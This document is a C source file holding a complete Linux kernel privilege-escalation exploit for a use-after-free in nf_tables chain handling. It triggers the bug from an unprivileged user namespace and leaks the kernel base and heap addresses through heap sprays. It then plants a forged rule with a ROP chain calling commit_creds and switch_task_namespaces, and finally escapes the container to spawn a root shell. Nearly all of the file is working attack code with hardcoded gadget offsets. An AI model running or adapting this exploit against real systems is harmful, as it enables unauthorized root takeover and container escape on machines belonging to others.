#include <sched.h>
#include <sys/msg.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stddef.h>

#include "util.h"

static void setup_state_for_kpti_trampoline(uint16_t *out_cs, uint16_t *out_ss,
					    uint64_t *out_rsp,
					    uint64_t *out_rflags)
{
	uint16_t cs, ss;
	uint64_t rsp, rflags;

	INFO("Setting up state for kpti trampoline");

	__asm__("mov %%cs, %0\n\t"
		"mov %%ss, %1\n\t"
		"mov %%rsp, %2\n\t"
		"pushfq\n\t"
		"pop %3\n\t"
		: "=r"(cs), "=r"(ss), "=r"(rsp), "=r"(rflags)
		:
		: "memory", "cc");

	*out_cs = cs;
	*out_ss = ss;
	*out_rsp = rsp;
	*out_rflags = rflags;
}

static int setup_namespace()
{
	INFO("Setting up namespace sandbox");

	// In order to use nf_tables, we need CAP_NET_ADMIN
	if (unshare(CLONE_NEWUSER | CLONE_NEWNET) == -1) {
		ERROR("unshare");
		return -1;
	}

	return 0;
}

static int setup_cpu_affinity()
{
	cpu_set_t set;

	INFO("Setting CPU affinity");

	// Set CPU affinity to make sure heap allocations won't spread over different CPUs
	CPU_ZERO(&set);
	CPU_SET(0, &set); // Only use CPU 0
	if (sched_setaffinity(getpid(), sizeof(set), &set) == -1) {
		ERROR("sched_setaffinity");
		return -1;
	}

	return 0;
}

static struct mnl_socket *setup_netlink_netfilter_socket()
{
	struct mnl_socket *mnl = NULL;

	INFO("Opening netfilter socket");

	mnl = mnl_socket_open(NETLINK_NETFILTER);
	if (mnl == NULL) {
		ERROR("mnl_socket_open");
		return NULL;
	}

	return mnl;
}

static void post_exploit_escape_jail_and_spawn_root_shell()
{
	INFO("Post exploit, escaping jail and spawning root shell");

	setns(open("/proc/1/ns/mnt", O_RDONLY), 0);
	setns(open("/proc/1/ns/pid", O_RDONLY), 0);
	setns(open("/proc/1/ns/net", O_RDONLY), 0);

	char *args[] = { "/bin/bash", "-i", NULL };
	execve(args[0], args, NULL);
}

// This chain hosts a rule which has an immediate expression referring to the victim chain
// When `deactivate` is called on this chain, it will deactivate the immediate expression, thus decrease victim's `use` by 1
#define EFFECT_CHAIN_NAME "c_effect"
// This chain hosts a rule which has an immediate expression referring to the effect chain
// When `deactivate` is called on this chain, it will also call `deactivate` on the effect chain
#define ATTACKER_CHAIN_NAME "c_attack"
// This chain hosts a rule which has an immediate expression referring to the victim chain
// Used for leaking data and calling functions in ops table after we reclaim the heap chunk used by the victim chain
#define PRIMITIVE_CHAIN_NAME "c_primitive"
// This chain hosts rules used for heap spraying
#define SPRAY_CHAIN_NAME "c_spray"

static int vuln_setup(struct mnl_socket *mnl, const char *table_name,
		      const char *victim_chain_name,
		      bool primitive_is_base_chain)
{
	struct nftnl_batch *batch;
	struct nftnl_expr *e;
	int seq = 1;
	int ret = -1;
	struct iovec iov;

	INFO("Setting up vuln");

	batch = nftnl_batch_alloc(MNL_SOCKET_BUFFER_SIZE,
				  MNL_SOCKET_BUFFER_SIZE);
	if (batch == NULL) {
		ERROR("nftnl_batch_alloc");
		return -1;
	}

	nftnl_batch_begin(nftnl_batch_buffer(batch), seq++);
	nftnl_batch_update(batch);

	if (util_create_nft_table(batch, seq++, table_name, NULL, 0))
		goto free_batch;

	if (util_create_nft_chain(batch, seq++, table_name, victim_chain_name,
				  0, INVALID_HOOKNUM, 0)) // Handle #1
		goto free_batch;

	if (util_create_nft_chain(batch, seq++, table_name, SPRAY_CHAIN_NAME, 0,
				  INVALID_HOOKNUM, 0)) // Handle #2
		goto free_batch;

	if (util_create_nft_chain(batch, seq++, table_name,
				  PRIMITIVE_CHAIN_NAME, 0,
				  primitive_is_base_chain ? NF_INET_LOCAL_OUT :
							    INVALID_HOOKNUM,
				  0)) // Handle #3
		goto free_batch;

	if ((e = util_create_immediate_jump_expr(victim_chain_name)) == NULL)
		goto free_batch;

	if (util_create_nft_rule(batch, seq++, table_name, PRIMITIVE_CHAIN_NAME,
				 &e, 1, NULL, 0)) // Handle #4
		goto free_batch;

	nftnl_batch_end(nftnl_batch_buffer(batch), seq);
	nftnl_batch_update(batch);
	nftnl_batch_iovec(batch, &iov, 1);

	if (mnl_socket_sendto(mnl, iov.iov_base, iov.iov_len) == -1) {
		ERROR("mnl_socket_sendto");
		goto free_batch;
	}

	ret = util_nftnl_run_callback(mnl, 2, seq, NULL, NULL);

	// If the batch completed successfully, VICTIM_CHAIN->use = 1
free_batch:
	nftnl_batch_free(batch);
	return ret;
}

// UAF victim is `nft_chain` object in kmalloc-128 cache
// and a string buffer in kmalloc-192 cache if we set victim_chain_name
// to a string that fits in kmalloc-192 cache
static int vuln_trigger(struct mnl_socket *mnl, const char *table_name,
			const char *victim_chain_name)
{
	struct nftnl_batch *batch;
	struct nftnl_expr *e;
	int seq = 1;
	int ret = -1;
	struct iovec iov;

	INFO("Triggering vuln");

	batch = nftnl_batch_alloc(MNL_SOCKET_BUFFER_SIZE,
				  MNL_SOCKET_BUFFER_SIZE);
	if (batch == NULL) {
		ERROR("nftnl_batch_alloc");
		return -1;
	}

	nftnl_batch_begin(nftnl_batch_buffer(batch), seq++);
	nftnl_batch_update(batch);

	if (util_create_nft_chain(batch, seq++, table_name, EFFECT_CHAIN_NAME,
				  NFT_CHAIN_BINDING, INVALID_HOOKNUM,
				  0)) // Handle #5
		goto free_batch;

	if ((e = util_create_immediate_jump_expr(victim_chain_name)) == NULL)
		goto free_batch;

	if (util_create_nft_rule(batch, seq++, table_name, EFFECT_CHAIN_NAME,
				 &e, 1, NULL, 0)) // Handle #6
		goto free_batch;

	if (util_delete_nft_rule(batch, seq++, table_name, EFFECT_CHAIN_NAME,
				 6))
		goto free_batch;

	if (util_create_nft_chain(batch, seq++, table_name, ATTACKER_CHAIN_NAME,
				  0, INVALID_HOOKNUM,
				  0)) // Handle #7
		goto free_batch;

	if ((e = util_create_immediate_jump_expr(EFFECT_CHAIN_NAME)) == NULL)
		goto free_batch;

	if (util_create_nft_rule(batch, seq++, table_name, ATTACKER_CHAIN_NAME,
				 &e, 1, NULL, 0)) // Handle #8
		goto free_batch;

	if (util_delete_nft_rule(batch, seq++, table_name, ATTACKER_CHAIN_NAME,
				 8))
		goto free_batch;

	nftnl_batch_end(nftnl_batch_buffer(batch), seq);
	nftnl_batch_update(batch);
	nftnl_batch_iovec(batch, &iov, 1);

	if (mnl_socket_sendto(mnl, iov.iov_base, iov.iov_len) == -1) {
		ERROR("mnl_socket_sendto");
		goto free_batch;
	}

	if (util_nftnl_run_callback(mnl, 2, seq, NULL, NULL) == -1)
		goto free_batch;

	nftnl_batch_free(batch);
	batch = nftnl_batch_alloc(MNL_SOCKET_BUFFER_SIZE,
				  MNL_SOCKET_BUFFER_SIZE);
	if (batch == NULL) {
		ERROR("nftnl_batch_alloc");
		return -1;
	}

	// When processing the above batch, after rule handle #6 is created, VICTIM_CHAIN->use = 2.
	// Then we delete that rule. The rule is deactivated, but still in the linked list of EFFECT_CHAIN
	// as it will only be removed after the transaction is processed. VICTIM_CHAIN->use = 1.
	// We create another rule with an immediate expression jumping qto EFFECT_CHAIN.
	// Deleting this rule cause `deactivate` to be called again on EFFECT_CHAIN,
	// which traverse through the rule list and call `deactivate` again on the deleted chain.
	// At this point, VICTIM_CHAIN->use = 0 and we can delete VICTIM_CHAIN in the next batch
	// while still having the immediate expression in PRIMITIVE_CHAIN pointing to it.

	seq = 1;
	nftnl_batch_begin(nftnl_batch_buffer(batch), seq++);
	nftnl_batch_update(batch);

	if (util_delete_nft_chain(batch, seq++, table_name, victim_chain_name))
		goto free_batch;

	nftnl_batch_end(nftnl_batch_buffer(batch), seq);
	nftnl_batch_update(batch);
	nftnl_batch_iovec(batch, &iov, 1);

	if (mnl_socket_sendto(mnl, iov.iov_base, iov.iov_len) == -1) {
		ERROR("mnl_socket_sendto");
		goto free_batch;
	}

	ret = util_nftnl_run_callback(mnl, 2, seq, NULL, NULL);

	// We sleep here to make sure that the chunk used by VICTIM_CHAIN
	// is freed by the release routine of the transaction.
	sleep(1);
free_batch:
	nftnl_batch_free(batch);
	return ret;
}

#define SPRAY_ITER 64
#define OBJECT_PER_SPRAY_ITER 8

static int
spray_nft_rule_kmalloc_128_for_leaking_kernel_base(struct mnl_socket *mnl,
						   const char *table_name)
{
	struct nftnl_batch *batch;
	struct nftnl_expr *e[9];
	char udata[16] = { 0 };
	int seq;
	struct iovec iov;

	INFO("Spraying nft_rule to kmalloc-128 to leak kernel base");

	for (int z = 0; z < SPRAY_ITER; z++) {
		batch = nftnl_batch_alloc(MNL_SOCKET_BUFFER_SIZE,
					  MNL_SOCKET_BUFFER_SIZE);
		if (batch == NULL) {
			ERROR("nftnl_batch_alloc");
			return -1;
		}

		seq = 1;
		nftnl_batch_begin(nftnl_batch_buffer(batch), seq++);
		nftnl_batch_update(batch);

		for (int y = 0; y < OBJECT_PER_SPRAY_ITER; y++) {
			for (int i = 0; i < 9; ++i)
				e[i] = util_create_notrack_expr();

			if (util_create_nft_rule(batch, seq++, table_name,
						 SPRAY_CHAIN_NAME, e, 9, udata,
						 sizeof(udata)))
				goto err_free_batch;
		}

		nftnl_batch_end(nftnl_batch_buffer(batch), seq);
		nftnl_batch_update(batch);
		nftnl_batch_iovec(batch, &iov, 1);

		if (mnl_socket_sendto(mnl, iov.iov_base, iov.iov_len) == -1) {
			ERROR("mnl_socket_sendto");
			goto err_free_batch;
		}

		if (util_nftnl_run_callback(mnl, 2, seq, NULL, NULL) == -1)
			goto err_free_batch;

		nftnl_batch_free(batch);
	}

	return 0;
err_free_batch:
	nftnl_batch_free(batch);
	return -1;
}

#define NFT_NOTRACK_EVAL 0xd50a10

static int callback_dump_expr_leak_kernel_base(struct nftnl_expr *e, void *data)
{
	uint64_t *kernel_base = (uint64_t *)data;
	const char *tmp;

	tmp = nftnl_expr_get_str(e, NFTNL_EXPR_IMM_CHAIN);
	*kernel_base = (*(uint64_t *)tmp) - NFT_NOTRACK_EVAL;

	return MNL_CB_OK;
}

static int callback_dump_rule_leak_kernel_base(const struct nlmsghdr *nlh,
					       void *data)
{
	struct nftnl_rule *r;

	if ((r = nftnl_rule_alloc()) == NULL) {
		ERROR("nftnl_rule_alloc");
		return MNL_CB_ERROR;
	}

	nftnl_rule_nlmsg_parse(nlh, r);
	nftnl_expr_foreach(r, callback_dump_expr_leak_kernel_base, data);
	nftnl_rule_free(r);

	return MNL_CB_OK;
}

static uint64_t leak_kernel_base(struct mnl_socket *mnl, const char *table_name)
{
	char buf[MNL_SOCKET_BUFFER_SIZE];
	struct nlmsghdr *hdr;
	struct nftnl_rule *r;
	uint64_t kernel_base = -2;

	INFO("Leaking kernel base");

	if ((r = nftnl_rule_alloc()) == NULL) {
		ERROR("nftnl_rule_alloc");
		return -1;
	}

	nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, NFPROTO_IPV4);
	nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table_name);
	nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, PRIMITIVE_CHAIN_NAME);
	nftnl_rule_set_u64(r, NFTNL_RULE_HANDLE,
			   4); // The rule under PRIMITIVE chain has handle #4

	hdr = nftnl_nlmsg_build_hdr(buf, NFT_MSG_GETRULE, NFPROTO_IPV4,
				    NLM_F_ACK, 1);
	nftnl_rule_nlmsg_build_payload(hdr, r);

	if (mnl_socket_sendto(mnl, buf, hdr->nlmsg_len) == -1) {
		ERROR("mnl_socket_sendto");
		return -1;
	}

	if (util_nftnl_run_callback(mnl, 1, 2,
				    callback_dump_rule_leak_kernel_base,
				    &kernel_base) == -1)
		return -1;

	return kernel_base;
}

static int
spray_nft_rule_kmalloc_192_for_leaking_kernel_heap(struct mnl_socket *mnl,
						   const char *table_name)
{
	struct nftnl_batch *batch;
	char udata[192 - sizeof(struct nft_rule) -
		   sizeof(struct nft_userdata)] = { 0 };
	int seq;
	struct iovec iov;

	INFO("Spraying nft_rule to kmalloc-192 to leak kernel heap");

	for (int z = 0; z < SPRAY_ITER; z++) {
		batch = nftnl_batch_alloc(MNL_SOCKET_BUFFER_SIZE,
					  MNL_SOCKET_BUFFER_SIZE);
		if (batch == NULL) {
			ERROR("nftnl_batch_alloc");
			return -1;
		}

		seq = 1;
		nftnl_batch_begin(nftnl_batch_buffer(batch), seq++);
		nftnl_batch_update(batch);

		for (int y = 0; y < OBJECT_PER_SPRAY_ITER; y++) {
			if (util_create_nft_rule(batch, seq++, table_name,
						 SPRAY_CHAIN_NAME, NULL, 0,
						 udata, sizeof(udata)))
				goto err_free_batch;
		}

		nftnl_batch_end(nftnl_batch_buffer(batch), seq);
		nftnl_batch_update(batch);
		nftnl_batch_iovec(batch, &iov, 1);

		if (mnl_socket_sendto(mnl, iov.iov_base, iov.iov_len) == -1) {
			ERROR("mnl_socket_sendto");
			goto err_free_batch;
		}

		if (util_nftnl_run_callback(mnl, 2, seq, NULL, NULL) == -1)
			goto err_free_batch;

		nftnl_batch_free(batch);
	}

	return 0;
err_free_batch:
	nftnl_batch_free(batch);
	return -1;
}

struct leak_kernel_heap_data {
	uint64_t heap;
	uint64_t rule_handle;
};

static int callback_dump_expr_leak_kernel_heap(struct nftnl_expr *e, void *data)
{
	struct leak_kernel_heap_data *leak_data =
		(struct leak_kernel_heap_data *)data;
	struct nft_rule *rule;
	const char *tmp;

	tmp = nftnl_expr_get_str(e, NFTNL_EXPR_IMM_CHAIN);
	// We want to also leak the rule handle, so the length of the string
	// should be larger than sizeof(rule->list)
	if (strlen(tmp) > sizeof(struct list_head)) {
		rule = (struct nft_rule *)tmp;
		// There might be case where `list.next` points back to nft_chain,
		// but we won't check since the chance is small.
		leak_data->heap = (uint64_t)rule->list.next;
		// We are leaking address of the next added rule, so +1 here.
		leak_data->rule_handle = rule->handle + 1;
	}

	return MNL_CB_OK;
}

static int callback_dump_rule_leak_kernel_heap(const struct nlmsghdr *nlh,
					       void *data)
{
	struct nftnl_rule *r;

	if ((r = nftnl_rule_alloc()) == NULL) {
		ERROR("nftnl_rule_alloc");
		return MNL_CB_ERROR;
	}

	nftnl_rule_nlmsg_parse(nlh, r);
	nftnl_expr_foreach(r, callback_dump_expr_leak_kernel_heap, data);
	nftnl_rule_free(r);

	return MNL_CB_OK;
}

static int leak_kernel_heap(struct mnl_socket *mnl, const char *table_name,
			    struct leak_kernel_heap_data *out_data)
{
	char buf[MNL_SOCKET_BUFFER_SIZE];
	struct nlmsghdr *hdr;
	struct nftnl_rule *r;
	out_data->heap = 0;
	out_data->rule_handle = -1;

	INFO("Leaking heap base");

	if ((r = nftnl_rule_alloc()) == NULL) {
		ERROR("nftnl_rule_alloc");
		return -1;
	}

	nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, NFPROTO_IPV4);
	nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table_name);
	nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, PRIMITIVE_CHAIN_NAME);
	nftnl_rule_set_u64(r, NFTNL_RULE_HANDLE,
			   4); // The rule under PRIMITIVE chain has handle #4

	hdr = nftnl_nlmsg_build_hdr(buf, NFT_MSG_GETRULE, NFPROTO_IPV4,
				    NLM_F_ACK, 1);
	nftnl_rule_nlmsg_build_payload(hdr, r);

	if (mnl_socket_sendto(mnl, buf, hdr->nlmsg_len) == -1) {
		ERROR("mnl_socket_sendto");
		return -1;
	}

	if (util_nftnl_run_callback(mnl, 1, 2,
				    callback_dump_rule_leak_kernel_heap,
				    out_data) == -1)
		return -1;

	return 0;
}

static int util_delete_leaked_rule(struct mnl_socket *mnl,
				   const char *table_name, uint64_t rule_handle)
{
	struct nftnl_batch *batch;
	int seq;
	struct iovec iov;
	int ret = -1;

	INFO("Deleting the leaked rule");

	batch = nftnl_batch_alloc(MNL_SOCKET_BUFFER_SIZE,
				  MNL_SOCKET_BUFFER_SIZE);
	if (batch == NULL) {
		ERROR("nftnl_batch_alloc");
		return -1;
	}

	seq = 1;
	nftnl_batch_begin(nftnl_batch_buffer(batch), seq++);
	nftnl_batch_update(batch);

	if (util_delete_nft_rule(batch, seq++, table_name, SPRAY_CHAIN_NAME,
				 rule_handle))
		goto free_batch;

	nftnl_batch_end(nftnl_batch_buffer(batch), seq);
	nftnl_batch_update(batch);
	nftnl_batch_iovec(batch, &iov, 1);

	if (mnl_socket_sendto(mnl, iov.iov_base, iov.iov_len) == -1) {
		ERROR("mnl_socket_sendto");
		goto free_batch;
	}

	ret = util_nftnl_run_callback(mnl, 2, seq, NULL, NULL);

	// We sleep here to make sure that the chunk used by the rule
	// is freed by the release routine of the transaction.
	sleep(1);
free_batch:
	nftnl_batch_free(batch);
	return ret;
}

static inline struct nft_expr *util_nft_expr_first(const struct nft_rule *rule)
{
	return (struct nft_expr *)&rule->data[0];
}

static inline struct nft_expr *util_nft_expr_last(const struct nft_rule *rule)
{
	return (struct nft_expr *)&rule->data[rule->dlen];
}

// swapgs_restore_regs_and_return_to_usermode + offset
#define KPTI_TRAMPOLINE 0x1201090 + 0x36
#define COMMIT_CREDS 0x110980
#define FIND_TASK_BY_VPID 0x1077c0
#define INIT_NSPROXY 0x2461f40
#define SWITCH_TASK_NAMESPACES 0x10efa0
#define INIT_CRED 0x2462180

// pop rdi ; ret
#define POP_RDI_RET 0x5dd5c0
// mov rdi, rax ; mov dword ptr [rdx], ecx ; mov rax, rdi ; jmp 0xffffffff82404200
#define MOV_RDI_RAX_MOV_PTR_RDX_RCX 0x5df50a
// pop rsi ; ret
#define POP_RSI_RET 0x5dc0d6

static size_t rop_chain_generate(uint64_t kernel_base, void *buf)
{
	uint64_t *rop = buf;
	uint16_t cs, ss;
	uint64_t rsp, rflags;

	INFO("Generating ROP chain");

	// commit_creds(&init_cred)
	*rop++ = kernel_base + POP_RDI_RET;
	*rop++ = kernel_base + INIT_CRED;
	*rop++ = kernel_base + COMMIT_CREDS;

	// switch_task_namespaces(find_task_by_vpid(1), &init_nsproxy)
	*rop++ = kernel_base + POP_RDI_RET;
	*rop++ = 1;
	*rop++ = kernel_base + FIND_TASK_BY_VPID;
	*rop++ = kernel_base + MOV_RDI_RAX_MOV_PTR_RDX_RCX;
	*rop++ = kernel_base + POP_RSI_RET;
	*rop++ = kernel_base + INIT_NSPROXY;
	*rop++ = kernel_base + SWITCH_TASK_NAMESPACES;

	// return to userspace
	*rop++ = kernel_base + KPTI_TRAMPOLINE;
	*rop++ = 0;
	*rop++ = 0;
	*rop++ = (uint64_t)post_exploit_escape_jail_and_spawn_root_shell;
	setup_state_for_kpti_trampoline(&cs, &ss, &rsp, &rflags);
	*rop++ = cs;
	*rop++ = rflags;
	*rop++ = rsp;
	*rop++ = ss;

	return (char *)rop - (char *)buf;
}

// push rsi ; jmp qword ptr [rsi + 0x66]
#define PUSH_RSI_JMP_PTR_RSI_66 0xc6b4e0
// pop rsp ; pop r13 ; jmp 0xffffffff82404200
#define POP_RSP_POP_R13_RET 0x37f22

static int spray_kmalloc_192_for_fake_nft_rule_and_rop(struct mnl_socket *mnl,
						       uint64_t kernel_base,
						       uint64_t heap_addr)
{
	struct nftnl_batch *batch;
	char udata[192] = { 0 };
	int seq;
	struct iovec iov;
	char table_name[32];
	struct nft_rule *rule = (struct nft_rule *)udata;
	struct nft_expr *expr = util_nft_expr_first(rule);
	struct nft_expr_ops *ops =
		(struct nft_expr_ops *)(udata - offsetof(struct nft_expr_ops,
							 validate));
	char *rop;

	INFO("Spraying kmalloc-192 to create fake nft_rule and store ROP chain for code execution");

	expr->ops = (struct nft_expr_ops *)(heap_addr -
					    offsetof(struct nft_expr_ops,
						     validate));
	rule->dlen = sizeof(struct nft_expr);
	// RSI points to expr
	ops->validate = (void *)(kernel_base + PUSH_RSI_JMP_PTR_RSI_66);
	rop = (char *)util_nft_expr_last(rule);
	rop_chain_generate(kernel_base, rop);
	// The JOP gadget jumps to [rsi + 0x66], so we put a stack pivot gadget there.
	// Conveniently, it's at the non relevant space of KPTI trampoline setup.
	// After the JOP gadget, the top of the stack is the address of expr
	// so a pop rsp; pop r13; ret should be enough to get the ROP chain running.
	*(uint64_t *)((char *)expr + 0x66) = kernel_base + POP_RSP_POP_R13_RET;

	for (int z = 0; z < SPRAY_ITER; z++) {
		batch = nftnl_batch_alloc(MNL_SOCKET_BUFFER_SIZE,
					  MNL_SOCKET_BUFFER_SIZE);
		if (batch == NULL) {
			ERROR("nftnl_batch_alloc");
			return -1;
		}

		seq = 1;
		nftnl_batch_begin(nftnl_batch_buffer(batch), seq++);
		nftnl_batch_update(batch);

		for (int y = 0; y < OBJECT_PER_SPRAY_ITER; y++) {
			util_generate_name(table_name, "tt");
			if (util_create_nft_table(batch, seq++, table_name,
						  udata, sizeof(udata)))
				goto err_free_batch;
		}

		nftnl_batch_end(nftnl_batch_buffer(batch), seq);
		nftnl_batch_update(batch);
		nftnl_batch_iovec(batch, &iov, 1);

		if (mnl_socket_sendto(mnl, iov.iov_base, iov.iov_len) == -1) {
			ERROR("mnl_socket_sendto");
			goto err_free_batch;
		}

		if (util_nftnl_run_callback(mnl, 2, seq, NULL, NULL) == -1)
			goto err_free_batch;

		nftnl_batch_free(batch);
	}

	return 0;
err_free_batch:
	nftnl_batch_free(batch);
	return -1;
}

static int
spray_kmalloc_128_fake_nft_chain_for_code_execution(struct mnl_socket *mnl,
						    uint64_t heap_addr)
{
	struct nftnl_batch *batch;
	char udata[128] = { 0 };
	int seq;
	struct iovec iov;
	char table_name[32];
	struct nft_chain *chain = (struct nft_chain *)udata;

	INFO("Spraying kmalloc-128 to create fake nft_chain for code execution");

	chain->rules.next = (void *)heap_addr;

	for (int z = 0; z < SPRAY_ITER; z++) {
		batch = nftnl_batch_alloc(MNL_SOCKET_BUFFER_SIZE,
					  MNL_SOCKET_BUFFER_SIZE);
		if (batch == NULL) {
			ERROR("nftnl_batch_alloc");
			return -1;
		}

		seq = 1;
		nftnl_batch_begin(nftnl_batch_buffer(batch), seq++);
		nftnl_batch_update(batch);

		for (int y = 0; y < OBJECT_PER_SPRAY_ITER; y++) {
			util_generate_name(table_name, "tt");
			if (util_create_nft_table(batch, seq++, table_name,
						  udata, sizeof(udata)))
				goto err_free_batch;
		}

		nftnl_batch_end(nftnl_batch_buffer(batch), seq);
		nftnl_batch_update(batch);
		nftnl_batch_iovec(batch, &iov, 1);

		if (mnl_socket_sendto(mnl, iov.iov_base, iov.iov_len) == -1) {
			ERROR("mnl_socket_sendto");
			goto err_free_batch;
		}

		if (util_nftnl_run_callback(mnl, 2, seq, NULL, NULL) == -1)
			goto err_free_batch;

		nftnl_batch_free(batch);
	}

	return 0;
err_free_batch:
	nftnl_batch_free(batch);
	return -1;
}

static int rip_create_rule_to_trigger_expr_validate(struct mnl_socket *mnl,
						    const char *table_name)
{
	struct nftnl_batch *batch;
	int seq;
	struct iovec iov;
	struct nftnl_expr *e;

	INFO("Creating a rule to trigger expr validate");

	batch = nftnl_batch_alloc(MNL_SOCKET_BUFFER_SIZE,
				  MNL_SOCKET_BUFFER_SIZE);
	if (batch == NULL) {
		ERROR("nftnl_batch_alloc");
		return -1;
	}

	seq = 1;
	nftnl_batch_begin(nftnl_batch_buffer(batch), seq++);
	nftnl_batch_update(batch);

	if ((e = util_create_immediate_return_expr()) == NULL)
		goto err_free_batch;

	if (util_create_nft_rule(batch, seq++, table_name, PRIMITIVE_CHAIN_NAME,
				 &e, 1, NULL, 0))
		goto err_free_batch;

	nftnl_batch_end(nftnl_batch_buffer(batch), seq);
	nftnl_batch_update(batch);
	nftnl_batch_iovec(batch, &iov, 1);

	if (mnl_socket_sendto(mnl, iov.iov_base, iov.iov_len) == -1) {
		ERROR("mnl_socket_sendto");
		goto err_free_batch;
	}

	return 0;
err_free_batch:
	nftnl_batch_free(batch);
	return -1;
}

#define VICTIM_CHAIN_NAME "c_free"
// The following name fits in kmalloc-192 cache
#define VICTIM_CHAIN_LONG_NAME \
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

int main()
{
	struct mnl_socket *mnl;
	char table_name[32];
	uint64_t kernel_base;
	struct leak_kernel_heap_data leak_heap_data;

	INFO("======== Stage 0: Setup ========");

	if (setup_namespace() || setup_cpu_affinity() ||
	    (mnl = setup_netlink_netfilter_socket()) == NULL)
		return -1;

	INFO("======== Stage 1: Leak kernel base ========");

	do {
		util_generate_name(table_name, "t");

		if (vuln_setup(mnl, table_name, VICTIM_CHAIN_NAME, false))
			return -1;

		if (vuln_trigger(mnl, table_name, VICTIM_CHAIN_NAME))
			return -1;

		if (spray_nft_rule_kmalloc_128_for_leaking_kernel_base(
			    mnl, table_name))
			return -1;

		if ((kernel_base = leak_kernel_base(mnl, table_name)) == -1)
			return -1;

		if (kernel_base & 0xffffff)
			INFO("Kernel base leaking failed, retrying");
	} while (kernel_base & 0xffffff);

	INFO("Kernel base: 0x%lx", kernel_base);

	INFO("======== Stage 2: Leak kernel heap ========");

	do {
		util_generate_name(table_name, "t");

		if (vuln_setup(mnl, table_name, VICTIM_CHAIN_LONG_NAME, false))
			return -1;

		if (vuln_trigger(mnl, table_name, VICTIM_CHAIN_LONG_NAME))
			return -1;

		if (spray_nft_rule_kmalloc_192_for_leaking_kernel_heap(
			    mnl, table_name))
			return -1;

		if (leak_kernel_heap(mnl, table_name, &leak_heap_data) == -1)
			return -1;

		if (leak_heap_data.heap == 0)
			INFO("Kernel heap leaking failed, retrying");
	} while (leak_heap_data.heap == 0);

	INFO("Kernel heap: 0x%lx", leak_heap_data.heap);
	INFO("Leaked rule handle: %ld", leak_heap_data.rule_handle);

	INFO("======== Stage 3: Privilege escalation ========");

	if (util_delete_leaked_rule(mnl, table_name,
				    leak_heap_data.rule_handle))
		return -1;

	if (spray_kmalloc_192_for_fake_nft_rule_and_rop(mnl, kernel_base,
							leak_heap_data.heap))
		return -1;

	util_generate_name(table_name, "t");

	if (vuln_setup(mnl, table_name, VICTIM_CHAIN_LONG_NAME, true))
		return -1;

	if (vuln_trigger(mnl, table_name, VICTIM_CHAIN_LONG_NAME))
		return -1;

	if (spray_kmalloc_128_fake_nft_chain_for_code_execution(
		    mnl, leak_heap_data.heap))
		return -1;

	return rip_create_rule_to_trigger_expr_validate(mnl, table_name);
}
